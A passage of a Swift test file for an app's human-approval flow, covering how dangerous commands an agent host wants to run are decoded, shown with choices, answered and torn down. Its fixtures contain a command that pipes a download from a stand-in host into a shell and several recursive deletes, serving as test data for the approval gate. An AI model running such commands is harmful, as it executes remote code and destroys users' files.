import Foundation
import os
import Testing
@testable import Talaria

/// #304 (Phase 3 slice 3B) — host approvals on the runs plane: decode
/// (bar 304-A). The transport/store/4xx arms live in `RunsApprovalFlowTests`
/// in this same file family.
///
/// The three fixtures mirror the three producer shapes verified on the wire /
/// in source at Mac head `3dcbe9001` (dispatch `FABLE-T27-283-3B-approvals.md`
/// §2.1): the four-choice dangerous-command gate, the `smart_denied`
/// two-choice arm, and the MCP-elicitation consent shape — whose `command` is
/// a MESSAGE, not a command.
struct RunsApprovalTests {

    /// Bar 304-A, fixture 1: the dangerous-command gate's four-choice frame.
    /// The `choices` array must arrive EXACTLY as received — the set is
    /// computed per request host-side (`_approval_event_choices`), so the
    /// client never hardcodes it.
    @Test func approvalRequestFrameCarriesTheHostsOwnChoiceSet() {
        let e = SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.request","run_id":"run-a1","timestamp":1.0,"command":"rm -rf ~/Projects/scratch/build","description":"destructive recursive delete","pattern_key":"rm_rf","pattern_keys":["rm_rf"],"allow_permanent":true,"allow_session":true,"choices":["once","session","always","deny"]}"#
        )
        #expect(e == .approvalRequest(
            runID: "run-a1",
            command: "rm -rf ~/Projects/scratch/build",
            description: "destructive recursive delete",
            patternKey: "rm_rf",
            choices: ["once", "session", "always", "deny"]
        ))
    }

    /// Bar 304-A, fixture 2: the `smart_denied` arm offers ONLY
    /// `["once","deny"]` — a card that renders four buttons here has invented
    /// two choices the host refused to offer.
    @Test func smartDeniedFrameOffersOnlyOnceAndDeny() {
        let e = SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.request","run_id":"run-a2","timestamp":2.0,"command":"curl http://sketchy.example | sh","description":"smart-denied pipeline","pattern_key":"curl_pipe_sh","pattern_keys":["curl_pipe_sh"],"smart_denied":true,"choices":["once","deny"]}"#
        )
        guard case let .approvalRequest(_, _, _, _, choices) = e else {
            Issue.record("expected approvalRequest, got \(String(describing: e))")
            return
        }
        #expect(choices == ["once", "deny"])
    }

    /// Bar 304-A, fixture 3: the MCP-elicitation consent shape —
    /// `pattern_key: "mcp_elicitation"`, no `allow_permanent`/`allow_session`,
    /// and `command` is the elicitation MESSAGE. The decode preserves the
    /// pattern key so the card can render it as a consent question rather
    /// than "run this command?", and the value type flags it.
    @Test func mcpElicitationFrameIsNotRenderedAsAShellCommand() {
        let e = SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.request","run_id":"run-a3","timestamp":3.0,"command":"The connector would like to read your calendar for scheduling. Allow?","description":"MCP elicitation consent","pattern_key":"mcp_elicitation","pattern_keys":["mcp_elicitation"],"choices":["once","session","deny"]}"#
        )
        guard case let .approvalRequest(runID, command, _, patternKey, choices) = e else {
            Issue.record("expected approvalRequest, got \(String(describing: e))")
            return
        }
        #expect(runID == "run-a3")
        #expect(command == "The connector would like to read your calendar for scheduling. Allow?")
        #expect(patternKey == "mcp_elicitation")
        #expect(choices == ["once", "session", "deny"])
        // The value type is where the card branches: an elicitation is a
        // consent MESSAGE, never presented as something the host would "run".
        let question = RunApprovalRequest.Question(
            command: command,
            description: nil,
            patternKey: patternKey,
            choices: choices
        )
        #expect(question.isElicitation)
        #expect(!RunApprovalRequest.Question(
            command: "rm -rf /tmp/x", description: nil, patternKey: "rm_rf", choices: ["once", "deny"]
        ).isElicitation)
    }

    /// `approval.responded` decodes too — the teardown signal for a card
    /// someone else (or our own POST) already resolved.
    @Test func approvalRespondedFrameDecodesWithItsChoice() {
        let e = SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.responded","run_id":"run-a1","timestamp":4.0,"choice":"once","resolved":1}"#
        )
        #expect(e == .approvalResponded(choice: "once"))
    }

    /// A frame with an EMPTY or missing choice set cannot be rendered without
    /// inventing buttons — it stays `.ignored`, a valid frame the app
    /// declines to act on. Honest absence over fabricated choices.
    @Test func approvalRequestWithoutChoicesIsIgnoredNotInvented() {
        #expect(SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.request","run_id":"run-a4","command":"echo hi"}"#
        ) == .ignored("approval.request"))
        #expect(SessionsHermesClient.parseRunsFrame(
            #"{"event":"approval.request","run_id":"run-a4","command":"echo hi","choices":[]}"#
        ) == .ignored("approval.request"))
    }

    // MARK: - Choice display mapping (O1)

    /// O1: `session` is scoped to `approval_session_key`, which IS the run id
    /// — the button must not imply conversation scope.
    @Test func sessionChoiceRendersAsThisRunNeverAsSession() {
        let label = RunApprovalRequest.buttonLabel(for: "session")
        #expect(label == "THIS RUN")
        #expect(!label.localizedCaseInsensitiveContains("session"))
        #expect(RunApprovalRequest.consequenceStatement(for: "session", host: "mac-mini")
            .localizedCaseInsensitiveContains("one run"))
        #expect(RunApprovalRequest.accessibilityLabel(for: "session", host: "mac-mini")
            .localizedCaseInsensitiveContains("not the whole conversation"))
    }

    /// 304-A's forward-tolerance half: an UNKNOWN choice renders as itself —
    /// never dropped, and never given an invented consequence.
    @Test func unknownChoiceRendersRatherThanVanishing() {
        #expect(RunApprovalRequest.buttonLabel(for: "quarantine") == "QUARANTINE")
        // Fail-safe: an unknown choice's effect is the host's to define, so
        // it rides the second confirm with honest absence, not a guess.
        #expect(RunApprovalRequest.requiresConsequenceConfirm("quarantine"))
        #expect(RunApprovalRequest.consequenceStatement(for: "quarantine", host: "mac-mini")
            .contains("cannot describe"))
    }

    /// O1: one tap for `once`/`deny`; second confirm for `always`/`session`,
    /// with `always` naming the permanent-allowlist consequence.
    @Test func onceAndDenyAreOneTapWhileAlwaysAndSessionConfirm() {
        #expect(!RunApprovalRequest.requiresConsequenceConfirm("once"))
        #expect(!RunApprovalRequest.requiresConsequenceConfirm("deny"))
        #expect(RunApprovalRequest.requiresConsequenceConfirm("always"))
        #expect(RunApprovalRequest.requiresConsequenceConfirm("session"))
        #expect(RunApprovalRequest.consequenceStatement(for: "always", host: "mac-mini")
            .localizedCaseInsensitiveContains("permanently allowlists"))
    }
}

// MARK: - #304 transport + driver + sync (bars 304-B/C/D/F)

/// The answer POST, its 4xx classification, the driver's approval yields, and
/// the sync path's honest refusal — all against a scripted transport. Own
/// stub protocol (class-global script/log → `.serialized`), mirroring
/// `RunsPlaneTransportTests`' conventions: the >512B SSE padding (URLProtocol
/// flush threshold) and the runs dialect's no-`event:`-lines framing.
@Suite(.serialized)
struct RunsApprovalFlowTests {

    // MARK: Fixtures

    private struct RecordedRequest: Sendable {
        let method: String
        let path: String
        let host: String
        let body: String
        let authorization: String?
    }

    private final class ApprovalStubURLProtocol: URLProtocol, @unchecked Sendable {
        struct Script: Sendable {
            let response: @Sendable (URLRequest) throws -> (HTTPURLResponse, Data)
            var hangEventsAfterBody = false
        }
        nonisolated(unsafe) static var script: Script?
        static let recorded = OSAllocatedUnfairLock<[RecordedRequest]>(initialState: [])
        static let callCounts = OSAllocatedUnfairLock<[String: Int]>(initialState: [:])

        static func reset() {
            script = nil
            recorded.withLock { $0 = [] }
            callCounts.withLock { $0 = [:] }
        }
        static func requests() -> [RecordedRequest] { recorded.withLock { $0 } }
        static func count(_ path: String) -> Int { requests().filter { $0.path == path }.count }
        static func request(_ method: String, _ path: String) -> RecordedRequest? {
            requests().first { $0.method == method && $0.path == path }
        }
        static func nextIndex(for path: String) -> Int {
            callCounts.withLock { counts in
                let index = counts[path, default: 0]
                counts[path] = index + 1
                return index
            }
        }

        override class func canInit(with request: URLRequest) -> Bool { true }
        override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
        override func startLoading() {
            Self.recorded.withLock {
                $0.append(RecordedRequest(
                    method: request.httpMethod ?? "GET",
                    path: request.url?.path ?? "",
                    host: request.url?.host ?? "?",
                    body: Self.bodyString(request),
                    authorization: request.value(forHTTPHeaderField: "Authorization")
                ))
            }
            guard let script = Self.script else {
                client?.urlProtocol(self, didFailWithError: URLError(.badServerResponse))
                return
            }
            do {
                let (response, data) = try script.response(request)
                client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
                client?.urlProtocol(self, didLoad: data)
                if script.hangEventsAfterBody, request.url?.path.hasSuffix("/events") == true {
                    // Deliberately nothing: the zombie stream — only the
                    // stall guard ends this turn.
                } else {
                    client?.urlProtocolDidFinishLoading(self)
                }
            } catch {
                client?.urlProtocol(self, didFailWithError: error)
            }
        }
        override func stopLoading() {}
        static func bodyString(_ request: URLRequest) -> String {
            if let body = request.httpBody { return String(decoding: body, as: UTF8.self) }
            guard let stream = request.httpBodyStream else { return "" }
            stream.open()
            defer { stream.close() }
            var data = Data()
            var buffer = [UInt8](repeating: 0, count: 4096)
            while stream.hasBytesAvailable {
                let read = stream.read(&buffer, maxLength: 4096)
                if read <= 0 { break }
                data.append(buffer, count: read)
            }
            return String(decoding: data, as: UTF8.self)
        }
    }

    /// The runs SSE dialect with the flush padding (see 3A's `runsSSE`).
    private static func runsSSE(_ frames: [String]) -> String {
        let padding = ": " + String(repeating: "-", count: 600) + "\n\n"
        return padding + frames.map { "data: \($0)\n\n" }.joined() + ": stream closed\n\n"
    }

    private static let messagesFixture = #"""
    {"session_id":"sess-r","data":[
      {"id":1,"role":"user","content":"KUMQUAT-N4A","timestamp":1754000000.0},
      {"id":2,"role":"assistant","content":"noted","timestamp":1754000005.0}
    ]}
    """#

    private static let runningStatus = #"{"object":"hermes.run","run_id":"run-r1","status":"running"}"#
    private static let waitingStatus = #"{"object":"hermes.run","run_id":"run-r1","status":"waiting_for_approval"}"#

    private static let fourChoiceFrame = #"{"event":"approval.request","run_id":"run-r1","timestamp":1.0,"command":"rm -rf ~/Projects/scratch/build","description":"destructive recursive delete","pattern_key":"rm_rf","pattern_keys":["rm_rf"],"allow_permanent":true,"allow_session":true,"choices":["once","session","always","deny"]}"#

    private static func atCall<T>(_ values: [T], _ index: Int) -> T {
        values[min(index, values.count - 1)]
    }

    private static func script(
        sseBody: String,
        statusBodies: [String] = [RunsApprovalFlowTests.runningStatus],
        eventsStatus: Int = 200,
        hangEventsAfterBody: Bool = false,
        approvalStatus: Int = 200,
        approvalBody: String = #"{"object":"hermes.run.approval_response","run_id":"run-r1","choice":"once","resolved":1}"#,
        approvalTransportFails: Bool = false
    ) -> ApprovalStubURLProtocol.Script {
        ApprovalStubURLProtocol.Script(
            response: { request in
                guard let url = request.url else { throw URLError(.badURL) }
                func reply(_ status: Int, _ body: String, contentType: String = "application/json") throws -> (HTTPURLResponse, Data) {
                    guard let response = HTTPURLResponse(
                        url: url, statusCode: status, httpVersion: "HTTP/1.1",
                        headerFields: ["Content-Type": contentType]
                    ) else { throw URLError(.badServerResponse) }
                    return (response, Data(body.utf8))
                }
                switch url.path {
                case "/api/sessions":
                    return try reply(200, #"{"session":{"id":"sess-r"}}"#)
                case "/api/sessions/sess-r/messages":
                    return try reply(200, RunsApprovalFlowTests.messagesFixture)
                case "/v1/runs":
                    return try reply(202, #"{"run_id":"run-r1","status":"started"}"#)
                case "/v1/runs/run-r1/events":
                    return try reply(eventsStatus, sseBody, contentType: "text/event-stream")
                case "/v1/runs/run-r1/approval":
                    if approvalTransportFails { throw URLError(.networkConnectionLost) }
                    return try reply(approvalStatus, approvalBody)
                case "/v1/runs/run-r1":
                    let call = ApprovalStubURLProtocol.nextIndex(for: url.path)
                    return try reply(200, atCall(statusBodies, call))
                default:
                    throw URLError(.badURL)
                }
            },
            hangEventsAfterBody: hangEventsAfterBody
        )
    }

    @MainActor
    private final class MutableBaseURLBox {
        var value: String
        init(_ value: String) { self.value = value }
    }

    @MainActor
    private func makeClient(label: String, baseURLBox: MutableBaseURLBox? = nil) -> SessionsHermesClient {
        let suiteName = "runs-approval-\(label)-\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defaults.removePersistentDomain(forName: suiteName)
        let persistence = UserDefaultsAppPersistenceStore(defaults: defaults)
        let configuration = URLSessionConfiguration.ephemeral
        configuration.protocolClasses = [ApprovalStubURLProtocol.self]
        let client = SessionsHermesClient(
            baseURLProvider: { baseURLBox?.value ?? "http://hermes.test" },
            apiKeyProvider: { "test-key" },
            journal: ConversationJournalStore(persistence: persistence),
            transplanter: ContextTransplanter(intelligence: LocalIntelligenceService()),
            session: URLSession(configuration: configuration)
        )
        client.runsPollInterval = .milliseconds(40)
        client.runsPollBudget = .milliseconds(800)
        return client
    }

    @MainActor
    private func makeChatStore(hermesClient: SessionsHermesClient) -> ChatStore {
        let suiteName = "runs-approval-chatstore-\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defaults.removePersistentDomain(forName: suiteName)
        return ChatStore(hermesClient: hermesClient, persistence: UserDefaultsAppPersistenceStore(defaults: defaults))
    }

    @MainActor
    private func collect(from client: SessionsHermesClient, message: String = "hi") async -> [StreamingUpdate] {
        let collector = Task { @MainActor in
            var updates: [StreamingUpdate] = []
            for await update in client.sendStreaming(message: message, attachments: [], clientMessageID: UUID()) {
                updates.append(update)
            }
            return updates
        }
        let belt = Task {
            try? await Task.sleep(for: .seconds(10))
            collector.cancel()
        }
        let updates = await collector.value
        belt.cancel()
        return updates
    }

    private static let testEndpoint = SessionsHermesClient.ResolvedEndpoint(baseURL: "http://hermes.test", apiKey: "test-key")

    // MARK: Bar 304-B — the answer POST

    /// The answer is exactly `{"choice":"once"}`, POSTed once to the run's
    /// approval path with the client's auth, and a 2xx classifies `.resolved`.
    @Test @MainActor
    func onceAnswerPostsExactlyOneChoiceBodyToTheRunsPath() async throws {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(sseBody: "")
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "answer-once")
        let outcome = await client.answerApproval(runID: "run-r1", choice: "once", endpoint: Self.testEndpoint)

        #expect(outcome == .resolved)
        #expect(ApprovalStubURLProtocol.count("/v1/runs/run-r1/approval") == 1)
        let post = try #require(ApprovalStubURLProtocol.request("POST", "/v1/runs/run-r1/approval"))
        #expect(post.body == #"{"choice":"once"}"#)
        #expect(post.authorization == "Bearer test-key")
    }

    /// #285's trap, pinned for the answer: the POST rides the endpoint ON THE
    /// CALL — never a re-resolution of the live providers — so a profile
    /// switch after the question arrived cannot redirect the answer.
    @Test @MainActor
    func answerRidesTheGivenEndpointNotTheLiveProviders() async throws {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(sseBody: "")
        defer { ApprovalStubURLProtocol.reset() }

        let baseURL = MutableBaseURLBox("http://hermes.test")
        let client = makeClient(label: "answer-endpoint-pin", baseURLBox: baseURL)
        // The switch happens BEFORE the answer goes out — the live provider
        // now names a different host than the run's frozen endpoint.
        baseURL.value = "http://hermes-b.test"
        let outcome = await client.answerApproval(runID: "run-r1", choice: "deny", endpoint: Self.testEndpoint)

        #expect(outcome == .resolved)
        let post = try #require(ApprovalStubURLProtocol.request("POST", "/v1/runs/run-r1/approval"))
        #expect(post.host == "hermes.test", "the answer must reach the run's birth host, not the flipped one")
    }

    // MARK: Bar 304-C — the 4xx arms, none rendering as success

    @Test @MainActor
    func expiredWindowClassifiesAsWindowClosedNotSuccess() async {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: "",
            approvalStatus: 409,
            approvalBody: #"{"error":{"message":"No pending approval for this run","code":"approval_not_pending"}}"#
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "answer-expired")
        let outcome = await client.answerApproval(runID: "run-r1", choice: "once", endpoint: Self.testEndpoint)
        #expect(outcome == .windowClosed)
        #expect(outcome != .resolved)
    }

    @Test @MainActor
    func noActiveApprovalSessionIsDistinctFromExpired() async {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: "",
            approvalStatus: 409,
            approvalBody: #"{"error":{"message":"No approval session for this run","code":"approval_not_active"}}"#
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "answer-notactive")
        let outcome = await client.answerApproval(runID: "run-r1", choice: "once", endpoint: Self.testEndpoint)
        #expect(outcome == .notActive)
        #expect(outcome != .windowClosed)
        #expect(outcome != .resolved)
    }

    @Test @MainActor
    func noFourXXClassifiesAsSuccess() async {
        defer { ApprovalStubURLProtocol.reset() }

        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: "",
            approvalStatus: 404,
            approvalBody: #"{"error":{"message":"Run not found: run-r1","code":"run_not_found"}}"#
        )
        let client = makeClient(label: "answer-4xx")
        let gone = await client.answerApproval(runID: "run-r1", choice: "once", endpoint: Self.testEndpoint)
        #expect(gone == .runGone)

        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: "",
            approvalStatus: 400,
            approvalBody: #"{"error":{"message":"Invalid approval choice","code":"invalid_approval_choice"}}"#
        )
        let rejected = await client.answerApproval(runID: "run-r1", choice: "sideways", endpoint: Self.testEndpoint)
        guard case .rejected(let detail) = rejected else {
            Issue.record("a 400 must classify as .rejected, got \(rejected)")
            return
        }
        #expect(detail.contains("Invalid approval choice") || detail.contains("400"))
        #expect(gone != .resolved)
    }

    /// #264's rule at the classification layer: a POST that never reached the
    /// host is `.unreachable` — not denied, not approved — and the store
    /// keeps the card live on it.
    @Test @MainActor
    func transportFailureClassifiesAsUnreachable() async {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(sseBody: "", approvalTransportFails: true)
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "answer-unreachable")
        let outcome = await client.answerApproval(runID: "run-r1", choice: "deny", endpoint: Self.testEndpoint)
        guard case .unreachable = outcome else {
            Issue.record("a transport failure must classify as .unreachable, got \(outcome)")
            return
        }
    }

    // MARK: The driver's approval yields

    /// An `approval.request` frame on the stream yields `.approvalRequested`
    /// carrying the host's own question AND the turn's frozen endpoint on the
    /// value — and terminal discipline holds around it (one `.finished`,
    /// bar 304-E's exactly-once half).
    @Test @MainActor
    func approvalFrameOnTheStreamYieldsTheQuestionWithTheFrozenEndpoint() async throws {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: Self.runsSSE([
                Self.fourChoiceFrame,
                #"{"event":"message.delta","run_id":"run-r1","timestamp":2.0,"delta":"done"}"#,
                #"{"event":"run.completed","run_id":"run-r1","timestamp":3.0,"output":"done","usage":{"input_tokens":3,"output_tokens":1,"total_tokens":4}}"#,
            ])
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "driver-question")
        let updates = await collect(from: client)

        let requests = updates.compactMap { update -> RunApprovalRequest? in
            if case .approvalRequested(let request) = update { return request }
            return nil
        }
        #expect(requests.count == 1)
        let request = try #require(requests.first)
        #expect(request.runID == "run-r1")
        #expect(request.endpoint == Self.testEndpoint)
        let question = try #require(request.question)
        #expect(question.command == "rm -rf ~/Projects/scratch/build")
        #expect(question.choices == ["once", "session", "always", "deny"])
        let finishes = updates.filter { if case .finished = $0 { return true } else { return false } }
        #expect(finishes.count == 1, "exactly one terminal yield — the #237 pin holds with a card in the turn")
    }

    /// Duplicate `approval.responded` frames each yield the (idempotent)
    /// teardown signal and never disturb terminal discipline.
    @Test @MainActor
    func duplicateApprovalRespondedFramesYieldIdempotentTeardownSignals() async {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: Self.runsSSE([
                Self.fourChoiceFrame,
                #"{"event":"approval.responded","run_id":"run-r1","timestamp":2.0,"choice":"once","resolved":1}"#,
                #"{"event":"approval.responded","run_id":"run-r1","timestamp":2.1,"choice":"once","resolved":1}"#,
                #"{"event":"message.delta","run_id":"run-r1","timestamp":3.0,"delta":"ran"}"#,
                #"{"event":"run.completed","run_id":"run-r1","timestamp":4.0,"output":"ran","usage":{"input_tokens":3,"output_tokens":1,"total_tokens":4}}"#,
            ])
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "driver-responded")
        let updates = await collect(from: client)

        let resolved = updates.filter { if case .approvalResolved = $0 { return true } else { return false } }
        #expect(resolved.count == 2, "both frames surface; idempotency is the store's job (bar 304-E)")
        let finishes = updates.filter { if case .finished = $0 { return true } else { return false } }
        #expect(finishes.count == 1)
    }

    // MARK: Bars 304-D(i)/(ii) + 304-F — the degraded states

    /// The stream never opens; the status object reports the run parked. The
    /// driver raises the DEGRADED shape exactly once — question nil, endpoint
    /// on the value — and NEVER a question (bar 304-F: the status object does
    /// not carry one). When the poll budget then expires on the legitimately
    /// parked run, the turn degrades to `.interrupted` — never a failure
    /// claim (bar 304-D(ii)).
    @Test @MainActor
    func statusAloneRaisesOnlyTheDegradedDenyShapeAndParkedExpiryIsInterrupted() async throws {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: #"{"error":{"message":"Run not found: run-r1","code":"run_not_found"}}"#,
            statusBodies: [Self.waitingStatus],
            eventsStatus: 404
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "degraded-park")
        let updates = await collect(from: client)

        let requests = updates.compactMap { update -> RunApprovalRequest? in
            if case .approvalRequested(let request) = update { return request }
            return nil
        }
        #expect(requests.count == 1, "the degraded shape raises exactly once per park")
        let request = try #require(requests.first)
        #expect(request.question == nil, "bar 304-F: a QUESTION may only come from a stream frame — status alone offers Deny with honest absence")
        #expect(request.endpoint == Self.testEndpoint)
        // 304-D(ii): the parked run's budget expiry is recovery, not failure.
        let interruptions = updates.filter { if case .interrupted = $0 { return true } else { return false } }
        #expect(interruptions.count == 1)
        #expect(!updates.contains { if case .failed = $0 { return true } else { return false } })
        #expect(!updates.contains { if case .finished = $0 { return true } else { return false } })
    }

    // MARK: Bar 304-D(iii) — the sync path's honest refusal (O5)

    /// A `send(...)` turn that meets `waiting_for_approval` names the parked
    /// approval — never "did not answer in time" — and stops polling a run
    /// that is not going to answer without a human.
    @Test @MainActor
    func aSyncTurnParkedOnAnApprovalSaysSoRatherThanTimingOut() async {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(sseBody: "", statusBodies: [Self.waitingStatus])
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "sync-parked")
        client.runsSyncBudget = .milliseconds(500)
        let message = await client.send(message: "hi", attachments: [], clientMessageID: UUID())

        #expect(message.sender == .system)
        #expect(message.status == .failed)
        #expect(message.content.localizedCaseInsensitiveContains("approval"),
                "the refusal must NAME the parked approval — got: \(message.content)")
        #expect(!message.content.contains("did not answer in time"),
                "bar 304-D(iii): the generic timeout string is the lie this bar exists to prevent")
        // Review round 3 (the rounds-1/2 false-instruction family, one
        // surface over): a sync-parked run has no stream and no replay, so
        // opening the app surfaces NO card — the copy must state the host's
        // deny-on-window-expiry and instruct NOTHING.
        #expect(message.content.localizedCaseInsensitiveContains("window expires"),
                "the refusal must state the host denies by its own timeout — got: \(message.content)")
        #expect(!message.content.localizedCaseInsensitiveContains("open talaria"),
                "no instruction to open an app that cannot show the approval — got: \(message.content)")
        #expect(!message.content.localizedCaseInsensitiveContains("open the chat"))
        // The park is knowable on the FIRST read — burning the budget against
        // it would be the old behavior wearing a new message.
        #expect(ApprovalStubURLProtocol.count("/v1/runs/run-r1") == 1)
    }

    // MARK: ChatStore routes the card and tears it down (bar 304-E)

    /// End to end through a real `ChatStore`: the question reaches
    /// `HostApprovalStore` while the turn is live, and the driver's exit —
    /// here via stall-guard recovery finding the run cancelled — tears the
    /// card down rather than leaving it tappable against a finished run.
    @Test @MainActor
    func chatStoreRaisesTheCardMidTurnAndTearsItDownAtTurnEnd() async throws {
        ApprovalStubURLProtocol.reset()
        ApprovalStubURLProtocol.script = Self.script(
            sseBody: Self.runsSSE([Self.fourChoiceFrame]),
            statusBodies: [#"{"object":"hermes.run","run_id":"run-r1","status":"cancelled"}"#],
            hangEventsAfterBody: true
        )
        defer { ApprovalStubURLProtocol.reset() }

        let client = makeClient(label: "chatstore-card")
        client.streamStallThreshold = .milliseconds(300)
        let chatStore = makeChatStore(hermesClient: client)
        let approvals = HostApprovalStore()
        chatStore.hostApprovals = approvals

        let sendTask = Task { @MainActor in
            _ = await chatStore.sendMessage("hi")
        }
        let belt = Task {
            try? await Task.sleep(for: .seconds(10))
            sendTask.cancel()
        }

        // The question must surface WHILE the turn is live.
        var pumps = 0
        while approvals.current == nil, pumps < 400 {
            pumps += 1
            try? await Task.sleep(for: .milliseconds(10))
        }
        #expect(approvals.current != nil, "the stream frame must raise the card mid-turn")
        #expect(approvals.current?.question?.choices == ["once", "session", "always", "deny"])

        await sendTask.value
        belt.cancel()

        // Bar 304-E: the turn is over (stall → poll → cancelled →
        // `.interrupted`); an outstanding card is torn down, not left
        // tappable against a cleared activeRunContext.
        #expect(approvals.current == nil, "a card outstanding at turn end must be torn down")
    }
}

// MARK: - #304 HostApprovalStore (bars 304-B/C/E and O1's second confirm)

/// The store's lifecycle, with the answer sender injected — no network.
@MainActor
struct HostApprovalStoreTests {

    private static let endpoint = SessionsHermesClient.ResolvedEndpoint(baseURL: "http://hermes.test", apiKey: "test-key")

    private static func request(runID: String = "run-s1", choices: [String] = ["once", "session", "always", "deny"]) -> RunApprovalRequest {
        RunApprovalRequest(
            runID: runID,
            profileID: nil,
            endpoint: endpoint,
            question: RunApprovalRequest.Question(
                command: "rm -rf /tmp/x",
                description: "destructive recursive delete",
                patternKey: "rm_rf",
                choices: choices
            )
        )
    }

    @MainActor
    private final class SenderProbe {
        var calls: [(runID: String, choice: String)] = []
        var outcomes: [RunApprovalAnswerOutcome]
        var gate: CheckedContinuation<Void, Never>?
        var holdsUntilReleased = false
        init(outcomes: [RunApprovalAnswerOutcome] = [.resolved]) {
            self.outcomes = outcomes
        }
        func attach(to store: HostApprovalStore) {
            store.sendAnswer = { [weak self] request, choice in
                guard let self else { return .unsupported }
                self.calls.append((request.runID, choice))
                if self.holdsUntilReleased {
                    await withCheckedContinuation { self.gate = $0 }
                }
                return self.outcomes.count > 1 ? self.outcomes.removeFirst() : self.outcomes[0]
            }
        }
    }

    /// Bar 304-E: torn down at turn end means torn down — a tap afterwards
    /// posts nothing.
    @Test func aCardOutstandingAtTurnEndIsTornDownNotLeftTappable() async {
        let store = HostApprovalStore()
        let probe = SenderProbe()
        probe.attach(to: store)

        store.raise(Self.request())
        #expect(store.current != nil)
        store.clearForTurnEnd()
        #expect(store.current == nil)

        await store.requestChoice("deny")
        #expect(probe.calls.isEmpty, "a torn-down card must never post")
    }

    /// Bar 304-B: at most one POST per card regardless of tap count — a
    /// second tap while the first is in flight is a no-op, and a resolved
    /// card never posts again.
    @Test func atMostOnePostPerCardRegardlessOfTapCount() async {
        let store = HostApprovalStore()
        let probe = SenderProbe()
        probe.holdsUntilReleased = true
        probe.attach(to: store)

        store.raise(Self.request())
        let firstTap = Task { @MainActor in await store.requestChoice("deny") }
        var pumps = 0
        while probe.calls.isEmpty, pumps < 200 {
            pumps += 1
            try? await Task.sleep(for: .milliseconds(5))
        }
        #expect(probe.calls.count == 1, "the first tap must reach the sender")

        // The double-tap, mid-flight: guarded, not queued.
        await store.requestChoice("deny")
        #expect(probe.calls.count == 1)

        probe.gate?.resume()
        probe.gate = nil
        await firstTap.value
        #expect(store.resolvedChoice == "deny")
        #expect(store.current == nil)

        // And after success: nothing left to post against.
        await store.requestChoice("once")
        #expect(probe.calls.count == 1)
    }

    /// O1: `always` (and any unknown choice) never posts on the first tap —
    /// the second confirm gates it, and backing out posts nothing.
    @Test func alwaysAndUnknownChoicesRequireTheSecondConfirm() async {
        let store = HostApprovalStore()
        let probe = SenderProbe()
        probe.attach(to: store)

        store.raise(Self.request())
        await store.requestChoice("always")
        #expect(probe.calls.isEmpty, "O1: the persistent scope must not post on one tap")
        #expect(store.pendingConsequenceChoice == "always")

        store.cancelPendingChoice()
        #expect(store.pendingConsequenceChoice == nil)
        #expect(probe.calls.isEmpty)

        await store.requestChoice("always")
        await store.confirmPendingChoice()
        #expect(probe.calls.map(\.choice) == ["always"])
    }

    /// #264's rule: an unreachable answer keeps the card LIVE — not denied,
    /// not approved — and a retry is legitimate (the POST never reached the
    /// host, so at-most-once is not spent).
    @Test func unreachableKeepsTheCardLiveAndAllowsRetry() async {
        let store = HostApprovalStore()
        let probe = SenderProbe(outcomes: [.unreachable("connection lost"), .resolved])
        probe.attach(to: store)

        store.raise(Self.request())
        await store.requestChoice("deny")
        #expect(store.current != nil, "an unanswered card must stay live on transport failure")
        #expect(store.transportNotice != nil)
        #expect(store.resolvedChoice == nil)

        await store.requestChoice("deny")
        #expect(probe.calls.count == 2)
        #expect(store.resolvedChoice == "deny")
        #expect(store.current == nil)
    }

    /// Bar 304-C in the store's rendering: the three terminal 4xx arms each
    /// produce a DISTINCT notice, none reads as success, and the card clears.
    @Test func theFourXXArmsRenderDistinctlyAndNeverAsSuccess() async {
        var notices: [String] = []
        for outcome in [RunApprovalAnswerOutcome.windowClosed, .notActive, .runGone] {
            let store = HostApprovalStore()
            let probe = SenderProbe(outcomes: [outcome])
            probe.attach(to: store)
            store.raise(Self.request())
            await store.requestChoice("once")
            #expect(store.current == nil, "\(outcome) is terminal for the card")
            #expect(store.resolvedChoice == nil, "\(outcome) must never read as success")
            guard let notice = store.resolutionNotice else {
                Issue.record("\(outcome) must render a notice")
                continue
            }
            notices.append(notice)
        }
        #expect(Set(notices).count == 3, "the three arms must be DISTINCT: \(notices)")
        // The window-closed arm names the host's deny; the not-active arm
        // must not claim an expiry it cannot know happened.
        if notices.count == 3 {
            #expect(notices[0].localizedCaseInsensitiveContains("denied"))
            #expect(!notices[1].localizedCaseInsensitiveContains("denied"))
        }
    }

    /// Bar 304-D(i) at the store: the degraded shape offers a working Deny —
    /// and a real question already up is never downgraded by a late park
    /// observation.
    @Test func degradedDenySendsAndARealQuestionIsNeverDowngraded() async {
        let store = HostApprovalStore()
